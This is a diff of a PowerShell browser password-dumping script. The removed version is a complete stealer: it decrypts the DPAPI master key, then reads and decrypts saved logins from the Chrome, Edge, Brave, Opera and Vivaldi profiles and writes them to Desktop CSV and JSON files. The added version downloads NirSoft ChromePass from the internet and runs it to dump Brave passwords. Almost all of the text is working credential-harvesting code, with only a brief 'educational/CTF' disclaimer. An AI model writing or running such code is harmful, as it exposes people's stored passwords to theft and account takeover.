@@ -1,240 +1,97 @@
-# =========================================
-# Browser Password Dumper - IMPROVED VERSION
-# (For Authorized Educational / CTF Use Only)
-# =========================================
+# Fixed NirSoft ChromePass Download Script
+$tempDir = "$env:TEMP\ChromePass"
+$chromePassUrl = "https://www.nirsoft.net/utils/chromepass.zip"
+$outputFile = ".\BravePasswords.csv"
 
-# Load required assemblies
-Add-Type -AssemblyName System.Security
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-Add-Type -Path "$PSScriptRoot\BouncyCastle.Cryptography.dll" # Load BouncyCastle
+# Create temporary directory
+New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
-# Define the DPAPI class for decryption
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class DPAPI {
-    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-    private static extern bool CryptUnprotectData(
-        ref DATA_BLOB pCipherText,
-        string pszDescription,
-        ref DATA_BLOB pEntropy,
-        IntPtr pReserved,
-        IntPtr pPromptStruct,
-        int dwFlags,
-        ref DATA_BLOB pPlainText);
-
-    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-    internal struct DATA_BLOB {
-        public int cbData;
-        public IntPtr pbData;
-    }
-
-    public static byte[] Decrypt(byte[] cipherText) {
-        DATA_BLOB cipherBlob = new DATA_BLOB();
-        DATA_BLOB plainBlob = new DATA_BLOB();
-        DATA_BLOB entropyBlob = new DATA_BLOB();
-
+try {
+    Write-Host "Downloading NirSoft ChromePass..." -ForegroundColor Yellow
+    
+    # Download with retry logic and proper error handling
+    $maxRetries = 3
+    $retryCount = 0
+    $success = $false
+    
+    do {
         try {
-            cipherBlob.pbData = Marshal.AllocHGlobal(cipherText.Length);
-            cipherBlob.cbData = cipherText.Length;
-            Marshal.Copy(cipherText, 0, cipherBlob.pbData, cipherText.Length);
-
-            if (!CryptUnprotectData(ref cipherBlob, null, ref entropyBlob, IntPtr.Zero, IntPtr.Zero, 0, ref plainBlob))
-                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
-
-            byte[] plainText = new byte[plainBlob.cbData];
-            Marshal.Copy(plainBlob.pbData, plainText, 0, plainBlob.cbData);
-            return plainText;
-        }
-        finally {
-            if (cipherBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(cipherBlob.pbData);
-            if (plainBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(plainBlob.pbData);
-            if (entropyBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(entropyBlob.pbData);
-        }
-    }
-}
-"@
-
-# AES-GCM decryption using BouncyCastle (More reliable)
-function Decrypt-AESGCM {
-    param(
-        [byte[]]$EncryptedData,
-        [byte[]]$Key
-    )
-    try {
-        # Check for v10 or v11 prefix
-        if (($EncryptedData[0] -eq 118 -and $EncryptedData[1] -eq 49) -and ($EncryptedData[2] -eq 48 -or $EncryptedData[2] -eq 49)) {
-            # v10 or v11: Structure is [v10|v11][12-byte IV][Ciphertext][16-byte Auth Tag]
-            $iv = $EncryptedData[3..14] # 12-byte Nonce/IV
-            $ciphertext = $EncryptedData[15..($EncryptedData.Length - 17)] # Actual ciphertext
-            $tag = $EncryptedData[($EncryptedData.Length - 16)..($EncryptedData.Length - 1)] # 16-byte authentication tag
-
-            # Create cipher parameters
-            $keyParam = [Org.BouncyCastle.Crypto.Parameters.KeyParameter]::new($Key)
-            $parameters = [Org.BouncyCastle.Crypto.Parameters.AeadParameters]::new($keyParam, 128, $iv, $null) # 128-bit tag length
-
-            # Create and initialize the cipher
-            $cipher = [Org.BouncyCastle.Crypto.Modes.GcmBlockCipher]::new([Org.BouncyCastle.Crypto.Engines.AesEngine]::new())
-            $cipher.Init($false, $parameters) # false for decryption
-
-            # Create output array
-            $plainBytes = New-Object byte[]($cipher.GetOutputSize($ciphertext.Length))
-
-            # Process the data
-            $len = $cipher.ProcessBytes($ciphertext, 0, $ciphertext.Length, $plainBytes, 0)
-            $cipher.DoFinal($plainBytes, $len)
-
-            # Return decrypted string
-            return [System.Text.Encoding]::UTF8.GetString($plainBytes).TrimEnd(@(0)) # Trim null bytes
-        }
-        else {
-            # Old DPAPI encryption
-            return [System.Text.Encoding]::UTF8.GetString([DPAPI]::Decrypt($EncryptedData))
-        }
-    }
-    catch {
-        Write-Warning "AES-GCM Decryption failed for a password: $($_.Exception.Message)"
-        return "[Decryption Failed]"
-    }
-}
-
-# Extract and decrypt master key
-function Get-MasterKey {
-    param($LocalStatePath)
-    try {
-        $localState = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
-        $encKey = $localState.os_crypt.encrypted_key
-        $encKeyBytes = [System.Convert]::FromBase64String($encKey)
-        # Remove the 'DPAPI' prefix (first 5 bytes)
-        $encKeyBytesWithoutPrefix = $encKeyBytes[5..($encKeyBytes.Length - 1)]
-        return [DPAPI]::Decrypt($encKeyBytesWithoutPrefix)
-    }
-    catch {
-        Write-Warning "Could not extract master key from $LocalStatePath : $($_.Exception.Message)"
-        return $null
-    }
-}
-
-# Target browsers and their paths
-$browsers = @{
-    "Chrome"   = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-    "Edge"     = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
-    "Brave"    = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
-    "Opera"    = "$env:APPDATA\Opera Software\Opera Stable"
-    "OperaGX"  = "$env:APPDATA\Opera Software\Opera GX Stable"
-    "Vivaldi"  = "$env:LOCALAPPDATA\Vivaldi\User Data"
-}
-
-$results = @()
-
-foreach ($browserName in $browsers.Keys) {
-    Write-Host "Processing $browserName..." -ForegroundColor Yellow
-
-    $browserDataPath = $browsers[$browserName]
-
-    # Check if the browser installation path exists
-    if (-not (Test-Path $browserDataPath)) {
-        Write-Host "  -> $browserName path not found. Skipping." -ForegroundColor Gray
-        continue
-    }
-
-    # Find the Local State file
-    $localStatePath = Join-Path $browserDataPath "Local State"
-    if (-not (Test-Path $localStatePath)) {
-        Write-Host "  -> Local State file not found for $browserName. Skipping." -ForegroundColor Gray
-        continue
-    }
-
-    # Get the master key for the browser
-    $masterKey = Get-MasterKey $localStatePath
-    if (-not $masterKey) {
-        Write-Host "  -> Could not retrieve master key for $browserName. Skipping." -ForegroundColor Red
-        continue
-    }
-
-    # Find ALL login data files (for Default and other profiles)
-    $loginDataFiles = Get-ChildItem -Path $browserDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
-
-    if (-not $loginDataFiles) {
-        Write-Host "  -> No 'Login Data' files found for $browserName." -ForegroundColor Gray
-        continue
-    }
-
-    foreach ($loginDataFile in $loginDataFiles) {
-        $profileName = $loginDataFile.Directory.Name
-        Write-Host "  -> Found profile: $profileName" -ForegroundColor Cyan
-
-        $tempDb = "$env:TEMP\$browserName-$profileName-login.db"
-        try {
-            # Copy the DB file to avoid locking issues
-            Copy-Item $loginDataFile.FullName $tempDb -Force -ErrorAction Stop
-
-            # Build connection string and query
-            $connString = "Data Source=$tempDb;"
-            $conn = New-Object System.Data.SQLite.SQLiteConnection($connString)
-            $conn.Open()
-
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-
-            $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter $cmd
-            $dataset = New-Object System.Data.DataSet
-            $adapter.Fill($dataset) | Out-Null
-
-            $table = $dataset.Tables[0]
-
-            foreach ($row in $table.Rows) {
-                $url = $row.origin_url
-                $username = $row.username_value
-                $encPassword = $row.password_value
-
-                if ($encPassword.Length -gt 0) {
-                    $password = Decrypt-AESGCM -EncryptedData $encPassword -Key $masterKey
-                }
-                else {
-                    $password = ""
-                }
-
-                # Add the result to the collection
-                $results += [PSCustomObject]@{
-                    Browser   = $browserName
-                    Profile   = $profileName
-                    URL       = $url
-                    Username  = $username
-                    Password  = $password
-                    # MasterKey = [System.Convert]::ToBase64String($masterKey) # Uncomment if you need this
-                }
-            }
-            $conn.Close()
-            Write-Host "    Extracted $($table.Rows.Count) logins." -ForegroundColor Green
-        }
-        catch {
-            Write-Host "    ERROR processing profile $profileName : $($_.Exception.Message)" -ForegroundColor Red
-        }
-        finally {
-            # Clean up the temporary file
-            if (Test-Path $tempDb) {
-                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+            $zipPath = "$tempDir\chromepass.zip"
+            Write-Host "Attempt $($retryCount + 1) of $maxRetries..." -ForegroundColor Yellow
+            
+            # Use different download method
+            $webClient = New-Object System.Net.WebClient
+            $webClient.DownloadFile($chromePassUrl, $zipPath)
+            $success = $true
+            Write-Host "Download completed successfully!" -ForegroundColor Green
+            
+        } catch {
+            $retryCount++
+            Write-Host "Download attempt $retryCount failed: $($_.Exception.Message)" -ForegroundColor Red
+            if ($retryCount -lt $maxRetries) {
+                Write-Host "Retrying in 3 seconds..." -ForegroundColor Yellow
+                Start-Sleep -Seconds 3
             }
         }
+    } while (-not $success -and $retryCount -lt $maxRetries)
+    
+    if (-not $success) {
+        throw "Failed to download ChromePass after $maxRetries attempts"
     }
-}
-
-# Export the results
-if ($results.Count -gt 0) {
-    $desktopPath = [Environment]::GetFolderPath("Desktop")
-    $csvPath = Join-Path $desktopPath "browser_passwords.csv"
-    $jsonPath = Join-Path $desktopPath "browser_passwords.json"
-
-    $results | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8
-    $results | ConvertTo-Json -Depth 3 | Out-File $jsonPath -Encoding UTF8
-
-    Write-Host "`n✅ Extraction complete!" -ForegroundColor Green
-    Write-Host "✅ $($results.Count) passwords found." -ForegroundColor Green
-    Write-Host "✅ Files saved to your Desktop:" -ForegroundColor Green
-    Write-Host "   - $csvPath" -ForegroundColor Green
-    Write-Host "   - $jsonPath" -ForegroundColor Green
-}
-else {
-    Write-Host "`n❌ No passwords were found or extracted." -ForegroundColor Red
+    
+    # Verify ZIP file integrity
+    if (-not (Test-Path $zipPath)) {
+        throw "Downloaded file not found"
+    }
+    
+    $fileSize = (Get-Item $zipPath).Length
+    if ($fileSize -lt 1024) {
+        throw "Downloaded file is too small ($fileSize bytes), likely corrupted"
+    }
+    
+    Write-Host "Extracting ChromePass (file size: $fileSize bytes)..." -ForegroundColor Yellow
+    
+    # Extract with error handling
+    try {
+        Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
+    } catch {
+        # Try manual extraction as fallback
+        Write-Host "Standard extraction failed, trying alternative method..." -ForegroundColor Yellow
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
+    }
+    
+    # Look for the executable in common locations
+    $chromePassExe = Get-ChildItem -Path $tempDir -Recurse -Filter "ChromePass.exe" | Select-Object -First 1
+    
+    if ($chromePassExe -and (Test-Path $chromePassExe.FullName)) {
+        Write-Host "Extracting Brave passwords..." -ForegroundColor Green
+        
+        # Run ChromePass to extract passwords
+        & $chromePassExe.FullName /scomma $outputFile
+        
+        if (Test-Path $outputFile) {
+            $passwords = Import-Csv $outputFile
+            Write-Host "Successfully extracted $($passwords.Count) passwords from Brave!" -ForegroundColor Green
+            Write-Host "Saved to: $outputFile" -ForegroundColor Green
+            
+            # Display first few entries
+            if ($passwords.Count -gt 0) {
+                Write-Host "`nFirst 10 passwords:" -ForegroundColor Cyan
+                $passwords | Select-Object -First 10 | Format-Table -AutoSize
+            }
+        } else {
+            Write-Host "No passwords were extracted." -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host "ChromePass.exe not found in the extracted files." -ForegroundColor Red
+        Write-Host "Contents of temp directory:" -ForegroundColor Yellow
+        Get-ChildItem -Path $tempDir -Recurse | Format-Table Name, Length
+    }
+    
+} catch {
+    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
+} finally {
+    # Cleanup
+    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 }
